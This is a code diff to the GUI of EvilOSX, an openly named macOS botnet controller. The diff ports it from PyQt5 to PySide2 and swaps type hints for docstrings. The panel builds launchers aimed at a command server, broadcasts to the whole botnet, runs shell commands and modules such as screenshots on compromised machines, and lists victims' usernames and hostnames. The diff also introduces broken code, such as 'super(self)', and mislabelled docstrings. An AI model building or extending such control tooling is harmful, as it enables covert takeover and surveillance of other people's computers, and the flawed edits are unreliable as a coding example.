@@ -4,13 +4,13 @@ __license__ = "GPLv3"
 
 from os import path
 from time import strftime, localtime
-from typing import List
 from uuid import uuid4
 
-from PyQt5.Qt import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, QPalette, QColor, QPixmap, \
-                     QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
-                     QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit
-from PyQt5.QtCore import Qt
+from PySide2.QtCore import Qt
+from PySide2.QtGui import QPalette, QColor, QPixmap
+from PySide2.QtWidgets import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, \
+    QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
+    QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit
 
 from bot import launchers, loaders
 from server import modules
@@ -24,7 +24,7 @@ class _BuilderTab(QWidget):
     """Handles the creation of launchers."""
 
     def __init__(self):
-        super().__init__()
+        super(_BuilderTab, self).__init__()
 
         self._layout = QVBoxLayout()
 
@@ -74,8 +74,11 @@ class _BuilderTab(QWidget):
         self._layout.setAlignment(Qt.AlignTop)
         self.setLayout(self._layout)
 
-    def _set_on_loader_change(self, new_text: str):
-        """Handles the loader combobox change event."""
+    def _set_on_loader_change(self, new_text):
+        """Handles the loader combobox change event.
+
+        :type new_text: str
+        """
         while self._loader_layout.count():
             child = self._loader_layout.takeAt(0)
 
@@ -103,8 +106,11 @@ class _BuilderTab(QWidget):
         self._loader_layout.addWidget(create_button)
 
     @staticmethod
-    def display_error(text: str):
-        """Displays an error message to the user."""
+    def display_error(text):
+        """Displays an error message to the user.
+
+        :type text: str
+        """
         message = QMessageBox()
 
         message.setIcon(QMessageBox.Critical)
@@ -114,7 +120,10 @@ class _BuilderTab(QWidget):
         message.exec_()
 
     @staticmethod
-    def display_info(text: str):
+    def display_info(text):
+        """
+        :type text: str
+        """
         message = QMessageBox()
 
         message.setIcon(QMessageBox.Information)
@@ -123,9 +132,17 @@ class _BuilderTab(QWidget):
         message.setStandardButtons(QMessageBox.Ok)
         message.exec_()
 
-    def _on_create_launcher(self, server_host, server_port, program_directory, loader_name: str,
-                            launcher_name: str, input_fields: list):
-        """Creates the launcher and outputs it to the builds directory."""
+    def _on_create_launcher(self, server_host, server_port, program_directory,
+                            loader_name, launcher_name, input_fields):
+        """Creates the launcher and outputs it to the builds directory.
+
+        :type server_host: str
+        :type server_port: int
+        :type program_directory: str
+        :type loader_name: str
+        :type launcher_name: str
+        :type input_fields: list
+        """
         if not self._host_field.text():
             self.display_error("Invalid host specified.")
         elif not str(self._port_field.text()).isdigit():
@@ -157,7 +174,7 @@ class _BroadcastTab(QWidget):
     """Tab used to interact with the whole botnet at once."""
 
     def __init__(self, model):
-        super().__init__()
+        super(_BroadcastTab, self).__init__()
 
         self._model = model
 
@@ -174,7 +191,7 @@ class _ResponsesTab(QTabWidget):
     """Tab which shows all module and shell responses."""
 
     def __init__(self):
-        super().__init__()
+        super(_ResponsesTab, self).__init__()
 
         layout = QVBoxLayout()
         self._output_field = QTextEdit()
@@ -189,18 +206,27 @@ class _ResponsesTab(QTabWidget):
         """Clears all output."""
         self._output_field.clear()
 
-    def output(self, text: str):
-        """Adds a line to the output field."""
+    def output(self, text):
+        """Adds a line to the output field.
+
+        :type text: str
+        """
         self._output_field.append(text)
 
 
 class ModuleView(ModuleViewABC):
     """Used by modules to interact with this GUI."""
 
-    def __init__(self, responses_tab: _ResponsesTab):
+    def __init__(self, responses_tab):
+        """
+        :type responses_tab: _ResponsesTab
+        """
         self._responses_tab = responses_tab
 
-    def display_error(self, text: str):
+    def display_error(self, text):
+        """
+        :type text: str
+        """
         message_box = QMessageBox()
 
         message_box.setIcon(QMessageBox.Critical)
@@ -209,7 +235,10 @@ class ModuleView(ModuleViewABC):
         message_box.setStandardButtons(QMessageBox.Ok)
         message_box.exec_()
 
-    def display_info(self, text: str):
+    def display_info(self, text):
+        """
+        :type text: str
+        """
         message_box = QMessageBox()
 
         message_box.setIcon(QMessageBox.Information)
@@ -218,7 +247,11 @@ class ModuleView(ModuleViewABC):
         message_box.setStandardButtons(QMessageBox.Ok)
         message_box.exec_()
 
-    def should_continue(self, messages: List[str]) -> bool:
+    def should_continue(self, messages):
+        """
+        :type messages: list[str]
+        :rtype: bool
+        """
         messages.append("\nAre you sure you want to continue?")
 
         confirm = QMessageBox.question(self._responses_tab, "Confirmation",
@@ -229,15 +262,22 @@ class ModuleView(ModuleViewABC):
         else:
             return False
 
-    def output(self, line: str, prefix=""):
+    def output(self, line, prefix=""):
+        """
+        :type line: str
+        :type prefix: str
+        """
         self._responses_tab.output(line)
 
 
 class _ExecuteTab(QTabWidget):
     """Tab used to execute modules or shell commands on the selected bot."""
 
-    def __init__(self, responses_tab: _ResponsesTab, model):
-        super().__init__()
+    def __init__(self, responses_tab, model):
+        """
+        :type responses_tab: _ResponsesTab
+        """
+        super(_ExecuteTab, self).__init__()
 
         self._model = model
         self._current_layout = None
@@ -251,8 +291,11 @@ class _ExecuteTab(QTabWidget):
         self.setLayout(self._layout)
         self.set_empty_layout()
 
-    def set_current_bot(self, bot: Bot):
-        """Sets the connected bot this tab will interact with."""
+    def set_current_bot(self, bot):
+        """Sets the connected bot this tab will interact with.
+
+        :type bot: Bot
+        """
         self._current_bot = bot
 
     def _clear_layout(self):
@@ -274,8 +317,11 @@ class _ExecuteTab(QTabWidget):
 
         self._layout.addWidget(QLabel("Please select a bot in the table above."), 0, 0)
 
-    def set_module_layout(self, module_name: str = "screenshot"):
-        """Sets the layout which can execute modules."""
+    def set_module_layout(self, module_name="screenshot"):
+        """Sets the layout which can execute modules.
+
+        :type module_name: str
+        """
         self._current_layout = "Module"
         self._clear_layout()
 
@@ -359,15 +405,21 @@ class _ExecuteTab(QTabWidget):
         self._sub_layout.setContentsMargins(0, 15, 0, 0)
         self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)
 
-    def _on_command_type_change(self, text: str):
-        """Handles the command type combobox change event."""
+    def _on_command_type_change(self, text):
+        """Handles the command type combobox change event.
+
+        :type text: str
+        """
         if text == "Module":
             self.set_module_layout()
         else:
             self.set_shell_layout()
 
-    def _on_module_change(self, module_name: str):
-        """Handles module combobox changes."""
+    def _on_module_change(self, module_name):
+        """Handles module combobox changes.
+
+        :type module_name: str
+        """
         while self._sub_layout.count():
             child = self._sub_layout.takeAt(0)
 
@@ -398,7 +450,10 @@ class _ExecuteTab(QTabWidget):
         self._sub_layout.addWidget(run_button)
         self._sub_layout.setContentsMargins(0, 15, 0, 0)
 
-    def display_info(self, text: str):
+    def display_info(self, text):
+        """
+        :type text: str
+        """
         message_box = QMessageBox()
 
         message_box.setIcon(QMessageBox.Information)
@@ -407,8 +462,12 @@ class _ExecuteTab(QTabWidget):
         message_box.setStandardButtons(QMessageBox.Ok)
         message_box.exec_()
 
-    def _on_module_run(self, module_name: str, input_fields: list):
-        """Handles running modules."""
+    def _on_module_run(self, module_name, input_fields):
+        """Handles running modules.
+
+        :type module_name: str
+        :type input_fields: list
+        """
         set_options = []
 
         for input_field in input_fields:
@@ -442,8 +501,11 @@ class _ExecuteTab(QTabWidget):
                 self._current_bot.username, self._current_bot.hostname)
             )
 
-    def _on_command_run(self, command_input: QLineEdit):
-        """Handles running commands."""
+    def _on_command_run(self, command_input):
+        """Handles running commands.
+
+        :type command_input: QLineEdit
+        """
         if command_input.text().strip() == "":
             return
 
@@ -459,7 +521,7 @@ class _BotTable(QTableWidget):
     """Table which holds all bots."""
 
     def __init__(self):
-        super().__init__()
+        super(_BotTable, self).__init__()
 
         self._header_labels = ["UID", "Username", "Version", "Last Seen"]
 
@@ -477,8 +539,11 @@ class _BotTable(QTableWidget):
     def set_on_selection_changed(self, callback_function):
         self.itemSelectionChanged.connect(callback_function)
 
-    def add_bot(self, bot: Bot):
-        """Adds a bot to the table."""
+    def add_bot(self, bot):
+        """Adds a bot to the table.
+
+        :rtype bot: Bot
+        """
         self.setRowCount(self.rowCount() + 1)
         created_row = self.rowCount() - 1
 
@@ -489,8 +554,11 @@ class _BotTable(QTableWidget):
             strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
         ))
 
-    def remove_bot(self, bot: Bot):
-        """Removes a bot from the table."""
+    def remove_bot(self, bot):
+        """Removes a bot from the table.
+
+        :rtype bot: Bot
+        """
         pass
 
 
@@ -501,7 +569,7 @@ class _ControlTab(QWidget):
     """
 
     def __init__(self, model):
-        super().__init__()
+        super(_ControlTab, self).__init__()
 
         self._model = model
 
@@ -536,10 +604,16 @@ class _ControlTab(QWidget):
         self._execute_tab.set_module_layout()
         self._responses_tab.clear()
 
-    def get_table(self) -> _BotTable:
+    def get_table(self):
+        """
+        :rtype: _BotTable
+        """
         return self._bot_table
 
-    def get_responses_tab(self) -> _ResponsesTab:
+    def get_responses_tab(self):
+        """
+        :rtype: _ResponsesTab
+        """
         return self._responses_tab
 
 
@@ -547,7 +621,7 @@ class _HomeTab(QWidget):
     """Home tab which contains information about EvilOSX."""
 
     def __init__(self):
-        super().__init__()
+        super(_HomeTab, self).__init__()
 
         self._layout = QHBoxLayout()
         self.setLayout(self._layout)
@@ -575,7 +649,7 @@ class _TabbedWidget(QTabWidget):
     """Widget which holds all tabs."""
 
     def __init__(self, model):
-        super().__init__()
+        super(_TabbedWidget, self).__init__()
 
         self._home_tab = _HomeTab()
         self._control_tab = _ControlTab(model)
@@ -587,24 +661,39 @@ class _TabbedWidget(QTabWidget):
         self.addTab(self._broadcast_tab, "Broadcast")
         self.addTab(self._builder_tab, "Builder")
 
-    def get_home_tab(self) -> _HomeTab:
+    def get_home_tab(self):
+        """
+        :rtype: _HomeTab
+        """
         return self._home_tab
 
-    def get_control_tab(self) -> _ControlTab:
+    def get_control_tab(self):
+        """
+        :rtype: _ControlTab
+        """
         return self._control_tab
 
-    def get_broadcast_tab(self) -> _BroadcastTab:
+    def get_broadcast_tab(self):
+        """
+        :rtype: _BroadcastTab
+        """
         return self._broadcast_tab
 
-    def get_builder_tab(self) -> _BuilderTab:
+    def get_builder_tab(self):
+        """
+        :rtype: _BuilderTab
+        """
         return self._builder_tab
 
 
 class _MainWindow(QMainWindow):
     """Main GUI window which displays the tabbed widget."""
 
-    def __init__(self, central_widget: QWidget):
-        super().__init__()
+    def __init__(self, central_widget):
+        """
+        :type central_widget: QWidget
+        """
+        super(_MainWindow, self).__init__()
 
         self.setGeometry(0, 0, 1000, 680)
         self.setCentralWidget(central_widget)
@@ -614,7 +703,7 @@ class _QDarkPalette(QPalette):
     """Dark palette for a Qt application."""
 
     def __init__(self):
-        super().__init__()
+        super(_QDarkPalette, self).__init__()
 
         self._color_white = QColor(255, 255, 255)
         self._color_black = QColor(0, 0, 0)
@@ -637,8 +726,11 @@ class _QDarkPalette(QPalette):
         self.setColor(QPalette.Highlight, self._color_tertiary)
         self.setColor(QPalette.HighlightedText, self._color_black)
 
-    def apply(self, application: QApplication):
-        """Apply this theme to the given application."""
+    def apply(self, application):
+        """Apply this theme to the given application.
+
+        :type application: QApplication
+        """
         application.setStyle("Fusion")
         application.setPalette(self)
         application.setStyleSheet("QToolTip {{"
@@ -655,7 +747,10 @@ class ViewGUI(ViewABC):
     Used by the controller to communicate with the view.
     """
 
-    def __init__(self, model, server_port: int):
+    def __init__(self, model, server_port):
+        """
+        :type server_port: int
+        """
         self._model = model
         self._server_port = server_port
 
@@ -667,13 +762,23 @@ class ViewGUI(ViewABC):
 
         _QDarkPalette().apply(self._application)
 
-    def get_tabbed_widget(self) -> QWidget:
+    def get_tabbed_widget(self):
+        """
+        :rtype: QWidget
+        """
         return self._tabbed_widget
 
-    def output(self, line: str, prefix=""):
+    def output(self, line, prefix=""):
+        """
+        :rtype: line: str
+        :rtype: prefix: str
+        """
         self._tabbed_widget.get_control_tab().get_responses_tab().output(line)
 
-    def on_response(self, response: str):
+    def on_response(self, response):
+        """
+        :type response: str
+        """
         responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()
 
         self.output_separator()
@@ -681,19 +786,28 @@ class ViewGUI(ViewABC):
         for line in response.splitlines():
             responses_tab.output(line)
 
-    def on_bot_added(self, bot: Bot):
+    def on_bot_added(self, bot):
+        """
+        :rtype: Bot
+        """
         self._tabbed_widget.get_control_tab().get_table().add_bot(bot)
         self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
             VERSION, str(self._server_port), self._model.get_bot_amount()
         ))
 
-    def on_bot_removed(self, bot: Bot):
+    def on_bot_removed(self, bot):
+        """
+        :type: Bot
+        """
         bot_table = self._tabbed_widget.get_control_tab().get_table()
 
         bot_table.remove_bot(bot)
 
-    def on_bot_path_change(self, bot: Bot):
-        super().on_bot_path_change(bot)
+    def on_bot_path_change(self, bot):
+        """
+        :type bot: Bot
+        """
+        super(self).on_bot_path_change(bot)
 
     def start(self):
         self._main_window.show()
